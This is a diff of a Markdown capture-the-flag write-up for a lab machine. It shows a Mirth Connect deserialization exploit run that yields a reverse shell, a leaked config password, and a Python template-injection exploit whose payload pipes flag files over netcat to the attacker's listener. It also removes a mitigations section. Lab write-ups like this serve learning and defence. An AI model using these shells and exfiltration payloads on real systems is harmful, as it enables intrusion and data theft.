@@ -23,7 +23,7 @@ tags:
 
 ### 💻 Target Information
 - **Machine Name:** Interpreter
-- **Operating System:** Linux (Debian)
+- **Operating System:** Linux
 - **Difficulty:** Medium
 - **Vulnerabilities:** Mirth Connect XML Deserialization RCE (CVE-2023-43208), Server-Side Template Injection (SSTI) in internal service on port 54321
 
@@ -33,6 +33,9 @@ tags:
 
 ```bash
 nmap -A -sS -P -T4  --min-rate 5000 10.129.8.10
+```
+
+```text
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-28 15:01 UTC
 Nmap scan report for interpreter.htb (10.129.8.10)
 Host is up (0.24s latency).
@@ -258,11 +261,9 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 115.40 seconds
 
 A Linux machine.
-
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ```
 
-## Step 2 - Initial-Foothold
+## Step 2 - Initial Foothold
 
 ```text
 [*] While trying to enumerating the web, i saw that it's a mirth connect admin panel
@@ -360,33 +361,36 @@ if __name__ == "__main__":
 
 ```
 
-[*] Before running the Script start a nc listener.
-```
-
-- 🔍 *python3 mirth* https://interpreter.htb 10.10.****.**** 4444*
+- 🔍 *Before running the script, start a nc listener:*
+- 🔍 *Run:* `python3 mirth.py https://interpreter.htb 10.10.****.**** 4444`
 
 ```text
-Enjoy.
-
-[*] nc -lvnp 4444
+nc -lvnp 4444
 listening on [any] 4444 ...
 connect to [10.10.15.102] from (UNKNOWN) [10.129.8.10] 33174
 bash: cannot set terminal process group (3519): Inappropriate ioctl for device
 bash: no job control in this shell
+Enjoy.
+```
+
+```bash
 mirth@interpreter:/usr/local/mirthconnect$
+```
 
-got shell!.
+```text
+got shell!
+```
 
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+## Step 3 - Privilege Escalation
 
-Step=3: Privilege Escalation
+- 🔍 *linPEAS didn't give me anything useful.*
+- 🔍 *While enumerating, found some configuration files:*
 
-[*] linPEAS didn't gave me anything useful.
-
-[*] While enumerating found some. configuration file 
-
+```bash
 cat mirth*
+```
 
+```text
 # Mirth Connect configuration file
 
 # directories
@@ -515,7 +519,7 @@ database.password = MirthPass123!
 
 [*] Lets Create an Exploit:-
 
-```
+```bash
 python3 -c "
 import urllib.request, base64
 
@@ -544,98 +548,22 @@ print(resp.read().decode())
 "
 ```
 
-(note:- Before running the code please set up a listener at port 9004)
+> [!NOTE]
+> **Attack Flow:**
+> 1. Your Python script creates XML with malicious template code
+> 2. XML is sent to `http://127.0.0.1:54321/addPatient`
+> 3. Vulnerable server parses XML, extracts `firstname` field
+> 4. Server passes `firstname` to template engine (Jinja2/etc.)
+> 5. Template engine sees `{{...}}` and **EXECUTES** it as Python
+> 6. Python code runs: imports `os`, decodes Base64, runs `cat files | nc IP`
+> 7. Flag contents are sent to your netcat listener
 
-[*] Attack Flow:-
-```
-
-## Step 1 - Step 1: Your Python script creates XML with malicious template code
-
-```text
-↓
-```
-
-## Step 2 - Step 2: XML sent to http://127.0.0.1:54321/addPatient
-
-```text
-↓
-```
-
-## Step 3 - Step 3: Vulnerable server parses XML, extracts firstname field
+- 🔍 *(Note: Before running the code please set up a listener at port 9004)*
 
 ```text
-↓
-```
-
-## Step 4 - Step 4: Server passes firstname to template engine (Jinja2/etc.)
-
-```text
-↓
-```
-
-## Step 5 - Step 5: Template engine sees {{...}} and EXECUTES it as Python
-
-```text
-↓
-```
-
-## Step 6 - Step 6: Python code runs: imports os, decodes Base64, runs "cat files | nc IP"
-
-```text
-↓
-```
-
-## Step 7 - Step 7: Flag contents sent to your netcat listener
-
-```text
-[*] Got Flags:-
-
- nc -lvnp 9004
+nc -lvnp 9004
 listening on [any] 9004 ...
 connect to [10.10.15.102] from (UNKNOWN) [10.129.8.10] 43306
 ba21fce18e**********************
 d4723f6575**********************
-
-____________________________________________________________________________________________________________________________________________________________________________________________
 ```
-
-## Mitigations & Security Perspective
-
-> [!IMPORTANT]
-> **🛡️ Blue Team Infrastructure & Application Security Assessment**
-> Below is the post-exploitation blueprint analyzing every vulnerability and administrative configuration issue exploited in the Interpreter environment. Each identified weakness is mapped to its core risk, threat context, and practical defensive remediation strategies.
-
-### 🔴 Mirth Connect Deserialization RCE (CVE-2023-43208)
-
-> [!WARNING]
-> **Vulnerability Profile:**
-> Mirth Connect v4.4.0 is vulnerable to XML Deserialization (CVE-2023-43208) via the XStream framework on the HTTP API ports.
-
-> [!CAUTION]
-> **Risk & Downstream Threat Impact:**
-> Unauthenticated external attackers can execute arbitrary OS commands under the context of the service owner (`mirth`) by sending serialized Java objects, leading to system intrusion.
-
-> [!TIP]
-> **Defensive Remediation & Detection Strategies:**
-> - **Remediation:** Upgrade Mirth Connect to version 4.4.1 or later, which blocks unsafe classes from being deserialized.
-> - **Remediation:** Restrict access to Mirth Connect administration APIs using local host bindings or strict IP whitelisting.
-> - **Detection:** Track and alert on HTTP request headers sent to Mirth Connect API paths containing XML bodies with Java class instantiation definitions (such as `ProcessBuilder` or `ConstantTransformer`).
-
----
-
-### 🔴 Server-Side Template Injection (SSTI) in internal /addPatient Service
-
-> [!WARNING]
-> **Vulnerability Profile:**
-> The internal XML processing service on port 54321 is vulnerable to SSTI on the `/addPatient` endpoint.
-
-> [!CAUTION]
-> **Risk & Downstream Threat Impact:**
-> The service passes user-controlled XML parameters directly into a template rendering engine running as `root`. Exploitation allows any local user with access to port 54321 to execute commands as `root`, leading to complete privilege escalation.
-
-> [!TIP]
-> **Defensive Remediation & Detection Strategies:**
-> - **Remediation:** Avoid passing unvalidated strings to template rendering engines. Sanitize and cast inputs strictly.
-> - **Remediation:** Enforce the principle of least privilege: run the internal XML processing daemon under a restricted, non-root user account.
-> - **Detection:** Monitor local socket traffic to port 54321 for payloads containing template code tags (`{{` and `}}`) or Python execution libraries (`__import__`, `os.popen`).
-
